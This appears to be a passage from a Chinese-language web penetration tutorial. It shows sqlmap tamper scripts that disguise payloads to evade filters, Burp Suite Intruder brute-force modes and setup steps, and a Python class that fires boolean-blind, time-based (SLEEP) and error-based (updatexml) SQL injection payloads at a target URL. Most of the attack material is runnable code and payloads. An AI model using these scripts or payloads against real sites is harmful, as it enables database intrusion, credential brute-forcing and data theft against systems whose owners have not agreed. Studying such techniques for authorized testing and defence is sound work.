#### 自定义Tamper脚本开发
```python
#!/usr/bin/env python

"""
自定义Tamper脚本示例
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def 依赖检查():
    pass

def tamper(载荷, **参数):
    """
    自定义Tamper脚本：单引号替换为双引号
    """
    if 载荷:
        载荷 = 载荷.replace("'", "\"")
    
    return 载荷

# 另一个示例：随机大小写
def 随机大小写tamper(载荷, **参数):
    """
    随机大小写Tamper脚本
    """
    import random
    结果 = ""
    for 字符 in 载荷:
        if random.randint(0, 1):
            结果 += 字符.upper()
        else:
            结果 += 字符.lower()
    return 结果
```

### Intruder模块爆破利用

#### 攻击类型详解
```markdown
## 四种攻击模式

### 狙击手模式 (Sniper)
- **用途**: 单个参数爆破
- **特点**: 使用一个Payload集合
- **适用**: 测试单个参数的多种Payload

### 攻城锤模式 (Battering ram)
- **用途**: 多个参数同时爆破
- **特点**: 所有标记位置使用相同Payload
- **适用**: 测试多个参数使用相同值的情况

### 叉子模式 (Pitchfork)
- **用途**: 多个参数对应爆破
- **特点**: 每个位置使用不同的Payload集合
- **适用**: 用户名密码对应爆破

### 集束炸弹模式 (Cluster bomb)
- **用途**: 多个参数组合爆破
- **特点**: 所有Payload集合的笛卡尔积
- **适用**: 多参数全面组合测试
```

#### 配置步骤详解
```markdown
1. **选择攻击类型** - 根据场景选择合适的攻击模式
2. **设置Payload位置** - 使用§标记要爆破的参数
3. **配置Payload集合** - 设置Payload类型和具体内容
4. **设置资源池** - 配置请求线程和延迟
5. **开始攻击** - 点击Start Attack开始爆破
6. **分析结果** - 根据长度、状态码、内容等特征识别有效Payload
```

import requests
import time
import argparse

class SQL注入测试器:
    def __init__(self, 目标网址):
        self.目标网址 = 目标网址
        self.会话 = requests.Session()
    
    def 测试布尔盲注(self, 参数, 值):
        """测试布尔盲注漏洞"""
        真条件载荷 = f"{值}' AND '1'='1"
        假条件载荷 = f"{值}' AND '1'='2"
        
        真条件响应 = self.会话.get(f"{self.目标网址}?{参数}={真条件载荷}")
        假条件响应 = self.会话.get(f"{self.目标网址}?{参数}={假条件载荷}")
        
        return 真条件响应.content != 假条件响应.content
    
    def 测试时间盲注(self, 参数, 值):
        """测试时间盲注漏洞"""
        载荷 = f"{值}' AND SLEEP(5) -- "
        
        开始时间 = time.time()
        self.会话.get(f"{self.目标网址}?{参数}={载荷}")
        响应时间 = time.time() - 开始时间
        
        return 响应时间 > 5
    
    def 测试错误注入(self, 参数, 值):
        """测试错误注入漏洞"""
        载荷 = f"{值}' AND updatexml(1,concat(0x7e,(version())),1) -- "
        
        响应 = self.会话.get(f"{self.目标网址}?{参数}={载荷}")
        return "XPATH" in 响应.text or "MySQL" in 响应.text
